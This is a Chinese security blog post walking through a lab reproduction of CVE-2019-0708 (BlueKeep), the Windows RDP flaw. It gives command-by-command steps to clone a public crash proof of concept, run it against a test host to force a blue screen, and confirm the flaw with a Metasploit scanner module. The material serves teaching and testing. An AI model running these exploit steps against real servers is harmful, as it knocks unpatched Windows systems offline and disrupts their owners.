**HW期间，为防范钓鱼，即日起FreeBuf将取消投稿文章的一切外部链接。给您带来的不便，敬请谅解~**

## 0x00漏洞概述

Windows系列服务器于2019年5月15号，被爆出高危漏洞，该服务器漏洞利用方式是通过远程桌面端口 **3389**
，RDP协议进行攻击的，堪比WannaCry(蠕虫病毒)。

## 0x01影响版本

Windows 7

Windows Server 2008 R2

Windows Server 2008

Windows Server 2003

Windows XP

## 0x02漏洞复现

为了顺利利用成功，靶机需要开启3389端口，防火墙也要关闭状态

 **1.poc下载：**

CVE-2019-0708-POC GitHub：

    
    
    git clone https://github.com/n1xbyte/cve-2019-0708
    cd CVE-2019-0708

![1618638779_607a77bbed0a1cfc5475e.png!small?1618638790707](https://image.3001.net/images/20210417/1618638779_607a77bbed0a1cfc5475e.png!small?1618638790707)

![1618638624_607a77205e1a9749ee563.png!small?1618638624767](https://image.3001.net/images/20210417/1618638624_607a77205e1a9749ee563.png!small?1618638624767)

 **2.安装所需要的库(因为我的kali系统已经安装了这个库，这里就不截图展示)**

    
    
    pip3 install impacket
    

**3.执行POC开始攻击**

    
    
    python3 crashpoc.py 192.168.88.150 64  
    #ip地址 系统版本
    

![1618639870_607a7bfeb40290fe8cfe7.png!small?1618639871084](https://image.3001.net/images/20210417/1618639870_607a7bfeb40290fe8cfe7.png!small?1618639871084)

然后我们发现目标系统已蓝屏，说明我们攻击成功

![1618638773_607a77b5479a69fccc15f.png!small?1618638790709](https://image.3001.net/images/20210417/1618638773_607a77b5479a69fccc15f.png!small?1618638790709)

\--------------------------------------------------华丽丽的分割线-----------------------------------------------
## 使用MSF复现漏洞

 **优先下载POC到根目录下**

    
    
    git clone https://github.com/n1xbyte/cve-2019-0708  
    cd cve-2019-0708

 **启动msf**

    
    
    service postgresql start
    msfdb init
    msfconsole

 **搜索CVE-2019-0708相关漏洞利用模块**

    
    
    search 0708

![1618640008_607a7c88007a1b68853be.png!small?1618640008346](https://image.3001.net/images/20210417/1618640008_607a7c88007a1b68853be.png!small?1618640008346)

 **我们先使用这个辅助模块0**

    
    
    use 0

 **然后我们设置一下RHOSTS**

    
    
    set rhosts 192.168.88.150
    

![1618640098_607a7ce22ecf0acd4af4b.png!small?1618640098652](https://image.3001.net/images/20210417/1618640098_607a7ce22ecf0acd4af4b.png!small?1618640098652)

然后我们run以下，开始检测

    
    
    run

![1618640136_607a7d08be282a007bdd4.png!small?1618640137080](https://image.3001.net/images/20210417/1618640136_607a7d08be282a007bdd4.png!small?1618640137080)

 **结果显示这里存在这个漏洞**

 **那么接下来我们就利用我们下载的POC进行攻击尝试**

    
    
    python3 crashpoc.py 192.168.88.150 64

![1618640304_607a7db04f3f87f8b684c.png!small?1618640304905](https://image.3001.net/images/20210417/1618640304_607a7db04f3f87f8b684c.png!small?1618640304905)

 **然后我们发现攻击成功，系统再一次蓝屏**

![1618640292_607a7da45f834b9108ecb.png!small?1618640292739](https://image.3001.net/images/20210417/1618640292_607a7da45f834b9108ecb.png!small?1618640292739)

 **至此，这个漏洞的复现已经完成**

